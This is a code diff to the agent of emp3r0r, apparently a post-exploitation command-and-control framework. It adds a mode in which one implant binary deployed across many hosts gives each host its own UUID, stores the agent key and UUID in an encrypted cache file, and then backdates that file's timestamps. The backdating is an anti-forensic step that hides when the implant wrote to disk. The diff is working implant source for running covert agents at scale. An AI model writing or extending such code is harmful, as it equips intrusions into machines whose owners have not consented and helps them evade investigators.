@@ -11,11 +11,14 @@ import (
 	"crypto/x509"
 	"fmt"
 	"io"
+	"encoding/base64"
+	"encoding/json"
 	"os"
 	"strings"
 	"path/filepath"
 	"sync"
 
+	"github.com/google/uuid"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
@@ -295,6 +298,142 @@ func loadCachedAgentKey() (*ecdsa.PrivateKey, error) {
 		return nil, fmt.Errorf("not an ECDSA key")
 	}
 	return key, nil
+}
+
+// hostIdentityCache is the v2 key-cache payload: the session key plus the
+// per-host UUID minted in multi-host mode. JSON-framed inside the same
+// AES-GCM envelope; legacy blobs (raw PKCS8 DER) still load as key-only.
+type hostIdentityCache struct {
+	HostUUID string `json:"host_uuid"`
+	DER      []byte `json:"der"`
+}
+
+// loadCachedIdentity restores the key and (if present) the per-host UUID.
+func loadCachedIdentity() (*ecdsa.PrivateKey, string, error) {
+	path, err := keyCachePath()
+	if err != nil {
+		return nil, "", err
+	}
+	blob, err := os.ReadFile(path)
+	if err != nil {
+		return nil, "", err
+	}
+	kek, err := keyCacheKEK()
+	if err != nil {
+		return nil, "", err
+	}
+	block, err := aes.NewCipher(kek)
+	if err != nil {
+		return nil, "", err
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return nil, "", err
+	}
+	if len(blob) < gcm.NonceSize() {
+		return nil, "", fmt.Errorf("key cache too short")
+	}
+	plain, err := gcm.Open(nil, blob[:gcm.NonceSize()], blob[gcm.NonceSize():], nil)
+	if err != nil {
+		return nil, "", err
+	}
+	// v2: JSON envelope; legacy: raw PKCS8 DER (no host UUID)
+	var v2 hostIdentityCache
+	if jsonErr := json.Unmarshal(plain, &v2); jsonErr == nil && len(v2.DER) > 0 {
+		parsed, perr := x509.ParsePKCS8PrivateKey(v2.DER)
+		if perr == nil {
+			if key, ok := parsed.(*ecdsa.PrivateKey); ok {
+				return key, v2.HostUUID, nil
+			}
+		}
+	}
+	parsed, err := x509.ParsePKCS8PrivateKey(plain)
+	if err != nil {
+		return nil, "", err
+	}
+	key, ok := parsed.(*ecdsa.PrivateKey)
+	if !ok {
+		return nil, "", fmt.Errorf("not an ECDSA key")
+	}
+	return key, "", nil
+}
+
+// ApplyHostIdentity mints/restores the per-host UUID in multi-host mode.
+// ONE binary then deploys to MANY hosts: each first run derives a fresh
+// UUID (bound to this host's session key via the shared cache), so the
+// CC's TOFU pin never sees two hosts claiming one UUID. Runs BEFORE any
+// consumer of RuntimeConfig.AgentUUID (Tag, sysinfo, MsgAuth).
+func ApplyHostIdentity() {
+	if common.RuntimeConfig == nil || !common.RuntimeConfig.MultiHost {
+		return
+	}
+	if err := GetAgentKey(); err != nil {
+		logging.Errorf("ApplyHostIdentity: key: %v", err)
+		return
+	}
+	key, err := AgentPrivateKey()
+	if err != nil {
+		return
+	}
+	// restore host UUID if the cache already carries one
+	if !keyPersistDisabled() {
+		if cached, hostUUID, loadErr := loadCachedIdentity(); loadErr == nil && cached != nil && hostUUID != "" {
+			common.RuntimeConfig.AgentUUID = hostUUID
+			logging.Infof("Host identity restored: %s (parent build %s)", hostUUID, common.RuntimeConfig.AgentUUIDParent)
+			return
+		}
+	}
+	// first run on this host: mint a fresh UUID and persist key+uuid together
+	hostUUID := uuid.NewString()
+	common.RuntimeConfig.AgentUUID = hostUUID
+	if !keyPersistDisabled() {
+		if saveErr := saveCachedIdentity(key, hostUUID); saveErr != nil {
+			logging.Debugf("host identity cache: %v", saveErr)
+		}
+	}
+	logging.Infof("Multi-host mode: derived per-host UUID %s (parent build %s)", hostUUID, common.RuntimeConfig.AgentUUIDParent)
+}
+
+// saveCachedIdentity persists key + host UUID as the v2 JSON envelope.
+func saveCachedIdentity(key *ecdsa.PrivateKey, hostUUID string) error {
+	der, err := x509.MarshalPKCS8PrivateKey(key)
+	if err != nil {
+		return err
+	}
+	return writeKeyCacheBlob([]byte(fmt.Sprintf(`{"host_uuid":%q,"der":"%s"}`, hostUUID, base64.StdEncoding.EncodeToString(der))))
+}
+
+// writeKeyCacheBlob encrypts and stores a key-cache payload (shared by both formats).
+func writeKeyCacheBlob(plain []byte) error {
+	path, err := keyCachePath()
+	if err != nil {
+		return err
+	}
+	kek, err := keyCacheKEK()
+	if err != nil {
+		return err
+	}
+	block, err := aes.NewCipher(kek)
+	if err != nil {
+		return err
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return err
+	}
+	nonce := make([]byte, gcm.NonceSize())
+	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
+		return err
+	}
+	blob := gcm.Seal(nonce, nonce, plain, nil)
+	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
+		return err
+	}
+	if err := os.WriteFile(path, blob, 0o600); err != nil {
+		return err
+	}
+	util.BackdateFile(path, 20, 180)
+	return nil
 }
 
 // SignWithAgentKey signs data with the agent's unique key
